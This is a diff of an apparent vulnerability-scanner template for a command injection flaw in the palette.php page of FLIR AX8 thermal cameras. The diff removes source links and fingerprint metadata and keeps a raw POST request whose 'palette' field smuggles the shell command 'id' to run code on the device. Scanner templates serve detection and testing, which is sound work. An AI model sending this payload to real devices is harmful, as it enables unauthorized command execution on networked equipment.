@@ -3,12 +3,8 @@ info:
   name: FLIR-AX8热成像仪palette.php存在远程命令执行漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/bcqqbweu3d5o5klq'
+  description: ''
   tags: rce,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: bcqqbweu3d5o5klq
-    fofa: web.icon=="f4370ff0b4763e18159cd7cdf36a4542"
 http:
 - raw:
   - 'POST /palette.php HTTP/1.1
@@ -36,9 +32,7 @@ http:
     Content-Length: 19
 
 
-    palette=;id>66.txt;
-
-    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1728983552517-a00e4fc2-a512-4055-959a-4583a927ff7c.png)'
+    palette=;id>66.txt;'
   redirects: false
   matchers:
   - status:
